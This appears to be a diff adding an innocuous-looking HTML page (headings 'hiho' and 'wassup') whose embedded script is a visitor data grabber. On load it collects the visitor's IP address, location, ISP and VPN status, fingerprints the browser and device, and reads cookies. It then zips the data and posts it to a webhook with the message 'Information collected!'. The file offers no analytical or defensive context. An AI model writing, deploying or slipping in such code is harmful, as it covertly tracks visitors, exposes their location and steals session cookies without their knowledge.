@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Title</title>
+</head>
+<body>
+    <h1>hiho</h1>
+    <p>wassup</p>
+
+    <script src="https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js"></script>
+    <script>
+        // Function to handle IP info
+        function monke(json) {
+            console.log(json);
+
+            const domain = json.hostname || "Unknown";
+            const vpn = json.proxy ? "Yes" : /vpn/i.test(json.isp) ? "Yes" : "No";
+
+            const ipInfoText = `
+IP Info:
+> IP: ${json.ip}
+> Provider: ${json.org || "Unknown"}
+> Domain: ${domain}
+> Country: ${json.country || "Unknown"}
+> Region: ${json.region || "Unknown"}
+> City: ${json.city || "Unknown"}
+> Coords: ${json.loc || "Unknown"} (Approximate, https://www.google.com/maps?q=${json.loc || ""})
+> Timezone: ${json.timezone || "Unknown"}
+> Mobile: ${json.mobile ? "Yes" : "No"}
+> VPN: ${vpn}
+> Bot: ${json.bot ? "Yes" : "No"}
+`;
+
+            getDeviceInfo(ipInfoText);
+        }
+
+        // Function to capture browser and device information
+        function getDeviceInfo(ipInfoText) {
+            const userAgent = navigator.userAgent;
+            const browserInfo = (() => {
+                const browsers = [
+                    { name: "Edge", pattern: /Edg/ },
+                    { name: "Chrome", pattern: /Chrome/ },
+                    { name: "Firefox", pattern: /Firefox/ },
+                    { name: "Safari", pattern: /Safari/ },
+                    { name: "Opera", pattern: /OPR|Opera/ },
+                    { name: "Internet Explorer", pattern: /MSIE|Trident/ }
+                ];
+                const browser = browsers.find(b => b.pattern.test(userAgent)) || { name: "Unknown" };
+                const versionMatch = userAgent.match(new RegExp(`${browser.name}/(\\d+\\.\\d+)`));
+                return { name: browser.name, version: versionMatch ? versionMatch[1] : "Unknown" };
+            })();
+
+            const os = (() => {
+                if (/Windows NT/.test(userAgent)) return "Windows";
+                if (/Mac OS X/.test(userAgent)) return "MacOS";
+                if (/Linux/.test(userAgent)) return "Linux";
+                if (/Android/.test(userAgent)) return "Android";
+                if (/iPhone|iPad/.test(userAgent)) return "iOS";
+                return "Unknown";
+            })();
+
+            const deviceType = /Mobi/.test(userAgent) ? "Mobile" : /Tablet|iPad/.test(userAgent) ? "Tablet" : "Desktop";
+            const screenResolution = `${window.screen.width}x${window.screen.height}`;
+
+            const deviceInfoText = `
+Browser & Device Info:
+> Browser: ${browserInfo.name}
+> Browser Version: ${browserInfo.version}
+> User Agent: ${userAgent}
+> Operating System: ${os}
+> Device Type: ${deviceType}
+> Screen Resolution: ${screenResolution}
+`;
+
+            collectCookies(ipInfoText, deviceInfoText);
+        }
+
+        // Function to collect cookies
+        function collectCookies(ipInfoText, deviceInfoText) {
+            const cookies = document.cookie || "No cookies available.";
+            const cookieText = `
+Cookies:
+${cookies}
+`;
+
+            const zip = new JSZip();
+            zip.folder("IPInfo").file("ip_info.txt", ipInfoText);
+            zip.folder("BrowserDeviceInfo").file("browser_device_info.txt", deviceInfoText);
+            zip.folder("Cookies").file("cookies.txt", cookieText);
+
+            zip.generateAsync({ type: "blob" }).then(function(blob) {
+                const formData = new FormData();
+                formData.append("file", blob, "website_grabber.zip");
+                formData.append("content", "@everyone Information collected!");
+
+                fetch("webhook_url", {
+                    method: "POST",
+                    body: formData,
+                }).then(response => console.log("Response:", response))
+                  .catch(error => console.error("Error:", error));
+            });
+        }
+
+        // Fetch IP info and pass it to the monke function
+        function fetchIPInfo() {
+            var script = document.createElement("script");
+            script.src = "https://ipinfo.io/json?callback=monke";
+            document.body.appendChild(script);
+        }
+        
+        fetchIPInfo();
+    </script>
+</body>
+</html>
